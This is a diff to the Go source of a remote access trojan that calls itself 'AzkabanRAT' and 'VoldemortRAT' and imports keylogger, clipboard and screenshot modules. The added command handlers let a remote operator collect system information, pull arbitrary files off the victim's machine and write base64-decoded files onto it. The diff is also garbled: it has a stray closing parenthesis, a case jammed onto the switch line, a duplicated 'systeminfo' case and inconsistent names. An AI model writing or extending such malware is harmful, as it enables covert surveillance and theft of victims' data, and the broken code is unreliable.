@@ -10,6 +10,10 @@ import (
     "./clipboard"
     "./keylogger"
     "./screenshot"
+    "encoding/base64"
+    "os"
+)
+
 )
 func getLocalAttackerIP() string {
     conn, err := net.Dial("udp", "8.8.8.8:80")
@@ -39,7 +43,37 @@ func handleConnection(conn net.Conn) {
 
         cmd := strings.TrimSpace(commandLine)
 
-        switch {
+        switch {case cmd == "systeminfo":
+    output := runShellCommand("systeminfo")
+    conn.Write([]byte(output))
+
+case strings.HasPrefix(cmd, "download "):
+    filepath := strings.TrimPrefix(cmd, "download ")
+    data, err := os.ReadFile(filepath)
+    if err != nil {
+        conn.Write([]byte("[!] Failed to read file.\n"))
+    } else {
+        conn.Write([]byte("[STARTFILE]\n"))
+        conn.Write(data)
+        conn.Write([]byte("\n[ENDFILE]\n"))
+    }
+
+case strings.HasPrefix(cmd, "upload "):
+    filepath := strings.TrimPrefix(cmd, "upload ")
+    conn.Write([]byte("[VoldemortRAT] Send base64 file data:\n"))
+    dataLine, _ := reader.ReadString('\n')
+    decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dataLine))
+    if err != nil {
+        conn.Write([]byte("[!] Base64 decoding failed.\n"))
+    } else {
+        err := os.WriteFile(filepath, decoded, 0644)
+        if err != nil {
+            conn.Write([]byte("[!] File write failed.\n"))
+        } else {
+            conn.Write([]byte("[+] File uploaded successfully.\n"))
+        }
+    }
+
         case cmd == "exit":
             conn.Write([]byte("[AzkabanRAT] Farewell, master.\n"))
             return
@@ -56,6 +90,9 @@ func handleConnection(conn net.Conn) {
             } else {
                 conn.Write([]byte("[AzkabanRAT] Screenshot captured.\n"))
             }
+        case cmd == "systeminfo":
+    output := runShellCommand("systeminfo")
+    conn.Write([]byte(output))
 
         case cmd == "clipboard":
             text := clipboard.ReadClipboard()
